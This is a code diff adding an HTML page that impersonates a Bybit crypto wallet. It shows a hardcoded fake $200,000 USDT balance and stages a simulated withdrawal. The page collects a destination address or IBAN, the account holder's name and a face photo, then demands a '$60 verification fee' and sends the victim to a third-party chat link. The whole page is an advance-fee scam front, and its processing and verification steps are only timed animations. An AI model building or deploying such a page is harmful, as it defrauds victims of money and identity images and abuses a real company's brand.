@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Onchain pay — Bybit Wallet</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    /* Bybit-like dark theme with orange accents */
+    :root{
+      --bg-1: #0b0f19;
+      --bg-2: #0f1724;
+      --card: #0f1728;
+      --accent: #ff7a00; /* Bybit orange */
+      --muted: rgba(255,255,255,0.65);
+      --glass: rgba(255,255,255,0.03);
+      --notice-bg: #111621;
+      --notice-accent: #ffb77a;
+    }
+
+    body {
+      margin: 0;
+      font-family: Inter, "Segoe UI", Roboto, system-ui, -apple-system, "Helvetica Neue", Arial;
+      background: linear-gradient(180deg, var(--bg-1) 0%, var(--bg-2) 100%);
+      color: #e6eef8;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      width: 100%;
+      max-width: 420px;
+      padding: 28px;
+      box-sizing: border-box;
+      text-align: center;
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      border: 1px solid rgba(255,255,255,0.03);
+      border-radius: 14px;
+      box-shadow: 0 8px 30px rgba(2,6,23,0.6);
+    }
+    .logo {
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      gap:10px;
+      font-size: 1.2rem;
+      font-weight: 700;
+      margin-bottom: 6px;
+      letter-spacing: 0.4px;
+    }
+    .logo .dot {
+      width:10px;
+      height:10px;
+      border-radius:50%;
+      background: linear-gradient(45deg, var(--accent), #ff9944);
+      box-shadow: 0 4px 14px rgba(255,122,0,0.25);
+    }
+    .verified {
+      font-size: 0.85rem;
+      color: var(--muted);
+      margin-bottom: 16px;
+    }
+    .balance {
+      font-size: 2rem;
+      margin-bottom: 12px;
+      font-weight:700;
+      color: #fff;
+    }
+    .section {
+      background-color: var(--glass);
+      padding: 18px;
+      border-radius: 12px;
+      margin-bottom: 16px;
+      text-align: left;
+    }
+    .section h3 {
+      margin: 0 0 10px 0;
+      font-size: 1rem;
+      color: #cfe7ff;
+    }
+    .crypto-card {
+      display: flex;
+      justify-content: space-between;
+      background: linear-gradient(90deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      padding: 10px 14px;
+      border-radius: 10px;
+      margin-bottom: 10px;
+      border: 1px solid rgba(255,255,255,0.02);
+    }
+    .crypto-card span:first-child {
+      display:flex;
+      align-items:center;
+      gap:8px;
+      font-weight:600;
+      color:#fff;
+    }
+    .crypto-card .tag {
+      background: rgba(255,255,255,0.03);
+      padding: 4px 8px;
+      border-radius: 8px;
+      font-size: 0.85rem;
+      color: var(--muted);
+    }
+    .wallet-actions {
+      display: flex;
+      justify-content: space-around;
+      margin-top: 8px;
+    }
+    .wallet-actions div {
+      background: rgba(255,255,255,0.02);
+      color: var(--muted);
+      padding: 10px;
+      border-radius: 50%;
+      width: 56px;
+      height: 56px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 0.95em;
+      font-weight: 700;
+      cursor: pointer;
+      border: 1px solid rgba(255,255,255,0.02);
+    }
+    .button {
+      background-color: var(--accent);
+      color: white;
+      padding: 14px;
+      border: none;
+      border-radius: 10px;
+      width: 100%;
+      font-size: 1em;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 14px;
+      box-shadow: 0 6px 18px rgba(255,122,0,0.16);
+    }
+    input, select {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      margin-bottom: 12px;
+      font-size: 1em;
+      background: rgba(255,255,255,0.02);
+      color: #eaf5ff;
+      outline: none;
+      border: 1px solid rgba(255,255,255,0.02);
+    }
+    input::placeholder { color: rgba(234,245,255,0.4); }
+    .spinner {
+      margin: 20px auto;
+      width: 40px;
+      height: 40px;
+      border: 4px solid rgba(255,255,255,0.08);
+      border-top: 4px solid var(--accent);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .loading-text {
+      font-size: 0.9em;
+      opacity: 0.9;
+      text-align:center;
+      margin-top:8px;
+    }
+    .notice {
+      background-color: var(--notice-bg);
+      color: #f6efe6;
+      padding: 12px;
+      border-left: 4px solid var(--notice-accent);
+      border-radius: 8px;
+      margin-top: 12px;
+      text-align: left;
+    }
+    #supportButton {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      width: 60px;
+      height: 60px;
+      background-color: #071226;
+      color: var(--accent);
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-weight: 800;
+      font-size: 0.85em;
+      cursor: move;
+      z-index: 9999;
+      user-select: none;
+      box-shadow: 0 6px 18px rgba(1,6,16,0.6);
+      border: 1px solid rgba(255,255,255,0.03);
+    }
+    #supportButton a {
+      color: var(--accent);
+      text-decoration: none;
+      text-align: center;
+      display:block;
+      width:100%;
+      height:100%;
+      line-height:60px;
+    }
+
+    /* receipt styles */
+    #receipt {
+      display: none;
+    }
+    #licenseNotice {
+      display: none;
+    }
+    .muted-small { color: var(--muted); font-size:0.95rem; }
+  </style>
+</head>
+<body>
+  <div id="supportButton" title="Contact Support">
+    <a id="supportLink" href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" target="_blank" rel="noopener noreferrer">Support</a>
+  </div>
+
+  <div class="container" role="main">
+    <div class="logo"><div class="dot"></div>Bybit Wallet</div>
+    <div class="verified">✔️ Verified • Secure • Bybit</div>
+
+    <div class="balance" id="balanceDisplay">$200,000 USDT</div>
+
+    <div class="section">
+      <h3>Balances</h3>
+      <div class="crypto-card"><span><strong>BTC</strong></span><span class="tag">1.5 BTC</span></div>
+      <div class="crypto-card"><span><strong>ETH</strong></span><span class="tag">10 ETH</span></div>
+      <div class="crypto-card"><span><strong>USDT</strong></span><span class="tag" id="usdtBadge">200,000 USDT</span></div>
+    </div>
+
+    <div class="section">
+      <h3>Wallet</h3>
+      <div class="wallet-actions" aria-hidden="true">
+        <div title="Receive">↓</div>
+        <div title="Send">↑</div>
+        <div title="Swap">⇄</div>
+      </div>
+      <button class="button" onclick="showStep1()">WITHDRAW USDT</button>
+    </div>
+
+    <div class="section" id="step1" style="display:none;">
+      <h3>Select withdrawal method</h3>
+      <select id="method">
+        <option value="USDT">Tether (USDT)</option>
+        <option value="BTC">Bitcoin (BTC)</option>
+        <option value="ETH">Ethereum (ETH)</option>
+        <option value="BANK">Bank Transfer</option>
+      </select>
+      <input type="text" id="destination" placeholder="Wallet address or IBAN">
+      <input type="text" id="accountName" placeholder="Account holder name">
+      <button class="button" onclick="startLoading()">CONFIRM WITHDRAWAL</button>
+    </div>
+
+    <div class="section" id="loading" style="display:none; text-align:center;">
+      <div class="spinner" role="status" aria-hidden="true"></div>
+      <div class="loading-text">Processing withdrawal — one moment...</div>
+    </div>
+
+    <div class="section" id="receipt" style="display:none; background-color: rgba(255,255,255,0.02); color: #eaf5ff;">
+      <h2 style="margin-top:0; color:#fff;">Withdraw Initiated ✅</h2>
+      <p class="muted-small"><strong>Status:</strong> Awaiting Verification ⏳</p>
+      <p class="muted-small"><strong>Withdrawal Method:</strong> <span id="receiptMethod">—</span></p>
+      <p class="muted-small"><strong>Destination:</strong> <span id="receiptDestination">—</span></p>
+      <p class="muted-small"><strong>Amount:</strong> <span id="receiptAmount">$200,000 USDT</span></p>
+      <div class="notice">
+        <strong>⚠️ Notice:</strong>
+        <p>Your withdrawal is pending and will be processed after identity verification.</p>
+        <p>Complete Face Verification to ensure secure transfer to your destination account or address.</p>
+      </div>
+      <button class="button" onclick="startVerification()">VERIFY NOW</button>
+    </div>
+
+    <div class="section" id="verification" style="display:none;">
+      <h2 style="margin-top:0; color:#fff;">Face Verification</h2>
+      <p class="muted-small">Please upload or capture a clear image of your face to proceed.</p>
+      <input type="file" accept="image/*" id="faceImage">
+      <button class="button" onclick="submitVerification()">SUBMIT</button>
+    </div>
+
+    <div class="section" id="verifying" style="display:none; text-align:center;">
+      <div class="spinner" role="status" aria-hidden="true"></div>
+      <div class="loading-text">Verification in process…</div>
+    </div>
+
+    <div class="section" id="licenseNotice" style="display:none; background-color: rgba(255,255,255,0.02); color: #eaf5ff;">
+      <h2 style="margin-top:0; color:#fff;">Verification Required</h2>
+      <p><strong>Verification Fee</strong></p>
+      <p style="font-size:1.1rem; font-weight:700;">$60</p>
+      <div class="notice">
+        <strong>⚠️ Important:</strong>
+        <p>If you cancel now, the funds will be refunded to your wallet balance.</p>
+        <p>Once verification is completed, your withdrawal will be processed to the destination account.</p>
+      </div>
+      <button class="button" onclick="payVerification()">PAY $60 VERIFICATION FEE</button>
+    </div>
+  </div>
+
+  <script>
+    // Draggable support button (mouse + touch)
+    const button = document.getElementById("supportButton");
+    const supportLink = document.getElementById("supportLink");
+    let isDragging = false;
+    let offsetX = 0, offsetY = 0;
+
+    button.addEventListener("mousedown", (e) => {
+      isDragging = true;
+      offsetX = e.clientX - button.getBoundingClientRect().left;
+      offsetY = e.clientY - button.getBoundingClientRect().top;
+      e.preventDefault();
+    });
+    document.addEventListener("mousemove", (e) => {
+      if (!isDragging) return;
+      button.style.left = (e.clientX - offsetX) + "px";
+      button.style.top = (e.clientY - offsetY) + "px";
+      button.style.right = "auto";
+    });
+    document.addEventListener("mouseup", () => { isDragging = false; });
+
+    // Touch support
+    button.addEventListener("touchstart", (e) => {
+      const t = e.touches[0];
+      isDragging = true;
+      offsetX = t.clientX - button.getBoundingClientRect().left;
+      offsetY = t.clientY - button.getBoundingClientRect().top;
+    }, {passive:true});
+    document.addEventListener("touchmove", (e) => {
+      if (!isDragging) return;
+      const t = e.touches[0];
+      button.style.left = (t.clientX - offsetX) + "px";
+      button.style.top = (t.clientY - offsetY) + "px";
+      button.style.right = "auto";
+    }, {passive:true});
+    document.addEventListener("touchend", () => { isDragging = false; });
+
+    // App logic
+    const BALANCE_AMOUNT = 200000; // USDT
+    const BALANCE_CURRENCY = "USDT";
+
+    function formatMoney(n) {
+      try {
+        return "$" + Number(n).toLocaleString();
+      } catch {
+        return "$" + n;
+      }
+    }
+
+    // ensure display reflects constants
+    document.getElementById('balanceDisplay').textContent = formatMoney(BALANCE_AMOUNT) + " " + BALANCE_CURRENCY;
+    document.getElementById('usdtBadge').textContent = BALANCE_AMOUNT.toLocaleString() + " " + BALANCE_CURRENCY;
+    document.getElementById('receiptAmount').textContent = formatMoney(BALANCE_AMOUNT) + " " + BALANCE_CURRENCY;
+
+    function showStep1() {
+      document.getElementById('step1').style.display = 'block';
+      // scroll into view on mobile
+      document.getElementById('step1').scrollIntoView({behavior:'smooth'});
+    }
+
+    function startLoading() {
+      // Basic validation
+      const dest = document.getElementById('destination').value.trim();
+      if (!dest) {
+        alert('Please enter a destination wallet address or IBAN.');
+        return;
+      }
+
+      document.getElementById('step1').style.display = 'none';
+      document.getElementById('loading').style.display = 'block';
+
+      // Simulate processing
+      setTimeout(() => {
+        document.getElementById('loading').style.display = 'none';
+        document.getElementById('receipt').style.display = 'block';
+
+        const method = document.getElementById('method').value || '—';
+        const destination = dest || '—';
+        document.getElementById('receiptMethod').textContent = method;
+        document.getElementById('receiptDestination').textContent = destination;
+        // ensure amount shown is current balance
+        document.getElementById('receiptAmount').textContent = formatMoney(BALANCE_AMOUNT) + " " + BALANCE_CURRENCY;
+        document.getElementById('receipt').scrollIntoView({behavior:'smooth'});
+      }, 3000); // shortened for usability
+    }
+
+    function startVerification() {
+      document.getElementById('receipt').style.display = 'none';
+      document.getElementById('verification').style.display = 'block';
+      document.getElementById('verification').scrollIntoView({behavior:'smooth'});
+    }
+
+    function submitVerification() {
+      const fileInput = document.getElementById('faceImage');
+      if (!fileInput || !fileInput.files || fileInput.files.length === 0) {
+        alert('Please select or capture an image for verification.');
+        return;
+      }
+
+      document.getElementById('verification').style.display = 'none';
+      document.getElementById('verifying').style.display = 'block';
+
+      setTimeout(() => {
+        document.getElementById('verifying').style.display = 'none';
+        document.getElementById('licenseNotice').style.display = 'block';
+        document.getElementById('licenseNotice').scrollIntoView({behavior:'smooth'});
+      }, 2000); // simulate quick verification step
+    }
+
+    function payVerification() {
+      // In a real app you'd redirect to payment - simulate here
+      alert('Redirecting to secure payment for $60 verification fee...');
+      // Example: open support/help or payment gateway - placeholder
+      window.open(supportLink.href, '_blank', 'noopener');
+    }
+  </script>
+</body>
+</html>
